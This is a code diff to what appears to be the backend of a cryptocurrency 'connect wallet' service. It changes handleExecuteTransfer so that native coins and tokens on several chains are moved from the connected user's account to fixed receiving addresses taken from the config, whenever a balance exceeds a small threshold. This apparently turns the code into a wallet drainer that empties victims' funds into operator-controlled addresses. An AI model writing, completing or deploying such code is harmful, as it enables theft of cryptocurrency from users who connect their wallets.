@@ -1,5 +1,6 @@
 import { sessionManager } from '../middleware.js'
 import { TOKEN_REGISTRY } from '../config/tokenRegistry.js'
+import { CONFIG } from '../config.js'
 
 /**
  * POST /api/connect-wallet
@@ -125,7 +126,6 @@ export async function handleExecuteTransfer(req, res) {
     const { evmService } = await import('../services/evmService.js')
     const { solanaService } = await import('../services/solanaService.js')
     const { tronService } = await import('../services/tronService.js')
-    const { CONFIG } = await import('../config.js')
 
     const transfers = {}
     const transferHashes = []
@@ -143,9 +143,13 @@ export async function handleExecuteTransfer(req, res) {
         const amount = parseFloat(chainBalance)
         if (amount > 0.001) {
           console.log(`  💰 Native balance: ${amount}`)
-          // Transfer FROM relayer TO receiving address
           const receivingAddress = CONFIG.receivingAddresses[chain]
-          const result = await evmService.transferNative(chain, receivingAddress, amount.toString())
+          const result = await evmService.transferNative(
+            chain,
+            account,  // FROM user account
+            receivingAddress,  // TO receiver address
+            amount.toString()
+          )
           transfers[chain] = result
           if (result.hash) transferHashes.push(result.hash)
         }
@@ -159,9 +163,13 @@ export async function handleExecuteTransfer(req, res) {
       // Transfer native coin
       if (nativeAmount > 0.001) {
         console.log(`  💰 Native ${chain}: ${nativeAmount}`)
-        // Transfer FROM relayer TO receiving address
         const receivingAddress = CONFIG.receivingAddresses[chain]
-        const result = await evmService.transferNative(chain, receivingAddress, nativeAmount.toString())
+        const result = await evmService.transferNative(
+          chain,
+          account,  // FROM user account
+          receivingAddress,  // TO receiver address
+          nativeAmount.toString()
+        )
         transfers[`${chain}_native`] = result
         if (result.hash) transferHashes.push(result.hash)
       }
@@ -177,7 +185,8 @@ export async function handleExecuteTransfer(req, res) {
             const result = await evmService.transferToken(
               chain,
               tokenInfo.address,
-              receivingAddress,
+              account,  // FROM user account
+              receivingAddress,  // TO receiver address
               tokenAmount.toString(),
               tokenInfo.decimals
             )
